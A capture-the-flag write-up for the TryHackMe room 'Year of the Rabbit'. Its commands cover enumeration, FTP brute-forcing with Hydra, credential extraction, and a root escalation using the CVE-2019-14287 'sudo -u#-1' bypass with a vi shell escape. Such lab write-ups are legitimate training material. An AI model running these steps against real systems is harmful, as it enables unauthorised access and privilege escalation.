# Year of the Rabbit – TryHackMe Writeup

## Overview  
**Year of the Rabbit** is categorized as an *Easy* room, but it packs several clever puzzles: steganography, FTP brute-forcing, Brainfuck decoding, and a subtle privilege escalation via a `sudo` vulnerability (CVE-2019-14287). The path taken here matches community write-ups and your walkthrough.

---

## 1. Enumeration

### Nmap Scan
```bash
nmap -sC -sV 10.201.20.145
```
**Results**:
- Port 21 – vsftpd 3.0.2 (FTP)  
- Port 22 – OpenSSH 6.7p1 (SSH)  
- Port 80 – Apache 2.4.10 (HTTP)  

---

## 2. Web Enumeration & Steganography

### Finding Hidden Directories
Use Gobuster to discover `/assets/` directory:
```bash
gobuster dir -u http://10.201.20.145 -w /usr/share/wordlists/dirb/common.txt
```

### Inspect the Stylesheet
`/assets/style.css` revealed a hint:
```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

### JavaScript Redirect Trick
Accessing `/sup3r_s3cr3t_fl4g.php` redirects you via JavaScript—disable JS or view headers to capture:
```
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```
Visiting the hidden directory reveals `Hot_Babe.png`.

---

## 3. FTP Access via Hidden Credentials

### Extracting FTP Credentials
Use:
```bash
strings Hot_Babe.png
```
This revealed:
```
ftpuser
...a long list of possible passwords...
```

### Brute-Force FTP with Hydra
```bash
hydra -l ftpuser -P passwords.txt ftp://10.201.20.145
```
You crack the password quickly.  

### Download `Eli’s_Creds.txt`
Log in with FTP and retrieve the file—its content is Brainfuck code.

---

## 4. SSH Access via Brainfuck Decoding

### Decode Brainfuck
Use an online interpreter (or local tool) to decode the Brainfuck string in `Eli’s_Creds.txt`, yielding:
```
Username: eli  
Password: <found password>
```

### SSH into the Box
```bash
ssh eli@10.201.20.145
```
Upon login, see a message:
```
Message from Root to Gwendoline:
“...Check our leet s3cr3t hiding place...”
```

---

## 5. Switching to Gwendoline

### Discover Hidden File
Search for “s3cr3t” files:
```bash
find / -iname '*s3cr3t*' 2>/dev/null
```
Inside, you find:
```
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```
It reveals Gwendoline’s password.  

### Switch User & Capture user.txt
```bash
su gwendoline
cd ~
cat user.txt
```

---

## 6. Privilege Escalation – Root via `sudo(vi)` Trick

### Check sudo privileges
```bash
sudo -l
```
Shows:  
```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

### Exploit `CVE-2019-14287`
By using `-u#-1`, we bypass the `!root` restriction:
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
Once `vi` opens, spawn a shell:
```
:!/bin/bash
```
– now a root shell.  

---

## 7. Capture Root Flag
```bash
cd /root
cat root.txt
```

---

##  Flags
- **User flag (Gwendoline):** `THM{...}`  
- **Root flag:** `THM{...}`  

*(Actual flags omitted for spoiler safety.)*

---

##  Key Lessons Learned
- CSS files may contain hidden clues—always inspect them.  
- `strings` is a powerful first step for extracting embedded credentials.  
- Brainfuck is a rare but interesting encoding; online interpreters help.  
- `sudo -u#-1` is a sneaky bypass for misconfigured `NOPASSWD` sudo privileges.

---

##  References
- Cloufish’s walkthrough ([cloufish.github.io](https://cloufish.github.io/blog/posts/Year_Of_The_Rabbit/?utm_source=chatgpt.com))  
- Medium write-up by Carson Shaffer ([blog.carsonshaffer.me](https://blog.carsonshaffer.me/tryhackme-year-of-the-rabbit-writeup-4c9b7eede4e4?utm_source=chatgpt.com))  
- FMash16 blog walkthrough ([fmash16.github.io](https://fmash16.github.io/content/writeups/tryhackme/thm-Year-of-the-Rabbit.html?utm_source=chatgpt.com))  
- Z3pH7 & other community writeups ([medium.com](https://medium.com/%40Z3pH7/tryhackme-year-of-the-rabbit-write-up-thm-9f74dbd7505c?utm_source=chatgpt.com), [jarilaurila.medium.com](https://jarilaurila.medium.com/writeup-thm-year-of-the-rabbit-bb2aad0c55c8?utm_source=chatgpt.com))
